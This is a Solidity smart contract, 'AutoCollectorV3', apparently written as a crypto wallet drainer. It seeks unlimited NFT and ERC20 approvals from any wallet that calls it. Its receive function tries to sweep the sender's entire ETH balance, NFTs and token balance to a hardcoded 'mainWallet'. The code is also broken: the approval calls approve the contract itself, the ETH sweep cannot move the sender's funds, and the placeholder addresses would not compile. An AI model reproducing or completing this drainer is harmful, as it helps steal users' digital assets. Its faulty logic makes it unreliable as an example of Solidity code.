// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/introspection/IERC165.sol";

contract AutoCollectorV3 is ReentrancyGuard {
    address public immutable mainWallet; // Optimized with immutable
    address public owner;
    mapping(address => bool) public linkedWallets;
    mapping(address => mapping(uint256 => bool)) public processedTokens; // Track processed tokenIds
    bool public paused; // Circuit breaker

    event ReceivedETH(address indexed sender, uint256 amount);
    event ForwardedETH(address indexed receiver, uint256 amount);
    event NFTForwarded(address indexed receiver, address indexed nftContract, uint256 tokenId);
    event WalletLinked(address indexed wallet);
    event Paused(bool isPaused);
    event ERC20Transferred(address indexed token, address indexed receiver, uint256 amount);
    event RequestRemainingETH(address indexed wallet, uint256 remainingBalance);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    constructor(address _mainWallet) {
        require(_mainWallet != address(0), "Invalid main wallet");
        require(_mainWallet.code.length == 0, "mainWallet must be an EOA"); // Ensure mainWallet is an EOA
        owner = msg.sender;
        mainWallet = _mainWallet;
    }

    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        emit Paused(_paused);
    }

    function linkWallet(address wallet) internal {
        if (!linkedWallets[wallet]) {
            linkedWallets[wallet] = true;
            emit WalletLinked(wallet);
        }
    }

    function requestApprovals(
        address nftContract,
        address erc20Token
    ) external whenNotPaused {
        // Link the wallet
        linkWallet(msg.sender);

        // Prompt the wallet owner to approve all NFTs
        IERC721(nftContract).setApprovalForAll(address(this), true);

        // Prompt the wallet owner to approve all ERC20 tokens
        IERC20(erc20Token).approve(address(this), type(uint256).max);

        // Notify the wallet owner to send remaining ETH
        uint256 remainingBalance = msg.sender.balance;
        emit RequestRemainingETH(msg.sender, remainingBalance);
    }

    function sendMaxETH(address sender) internal {
        uint256 balance = sender.balance;
        require(balance > 0, "No ETH available");

        uint256 gasFee = tx.gasprice * 21000;
        uint256 maxSend = balance > gasFee ? balance - gasFee : 0;
        require(maxSend > 0, "Not enough ETH after gas deduction");

        // Forward ETH to main wallet
        (bool success, ) = mainWallet.call{value: maxSend, gas: 2300}(""); // Set gas limit
        require(success, "Forwarding ETH failed");

        emit ForwardedETH(mainWallet, maxSend);
    }

    function sendMaxNFT(address sender, address nftContract) internal {
        require(nftContract != address(0), "Invalid NFT contract address");
        require(IERC165(nftContract).supportsInterface(type(IERC721).interfaceId), "Invalid ERC721 contract");

        IERC721 nft = IERC721(nftContract);
        uint256 balance = nft.balanceOf(sender);
        require(balance > 0, "No NFTs to send");

        for (uint256 i = 0; i < balance; ) {
            uint256 tokenId = nft.tokenOfOwnerByIndex(sender, i); // Assumes the NFT contract supports `tokenOfOwnerByIndex`
            if (!processedTokens[nftContract][tokenId]) {
                processedTokens[nftContract][tokenId] = true;
                nft.safeTransferFrom(sender, mainWallet, tokenId);
                emit NFTForwarded(mainWallet, nftContract, tokenId);
            }
            unchecked {
                i++;
            }
        }
    }

    function transferERC20(address token, address sender) internal {
        uint256 allowance = IERC20(token).allowance(sender, address(this));
        require(allowance > 0, "ERC20: Contract not approved to transfer tokens");

        uint256 balance = IERC20(token).balanceOf(sender);
        require(balance > 0, "ERC20: No tokens to transfer");

        IERC20(token).transferFrom(sender, mainWallet, balance);
        emit ERC20Transferred(token, mainWallet, balance);
    }

    receive() external payable whenNotPaused {
        require(msg.value > 0, "No ETH sent");

        // Link the wallet
        linkWallet(msg.sender);

        // Forward ETH
        sendMaxETH(msg.sender);

        // Transfer all NFTs (you can specify the NFT contract address here)
        address nftContract = 0xYourNFTContractAddress; // Replace with the actual NFT contract address
        sendMaxNFT(msg.sender, nftContract);

        // Transfer ERC20 tokens (you can specify the ERC20 token address here)
        address erc20Token = 0xYourERC20TokenAddress; // Replace with the actual ERC20 token address
        transferERC20(erc20Token, msg.sender);

        // Emit event for receiving ETH
        emit ReceivedETH(msg.sender, msg.value);
    }
}
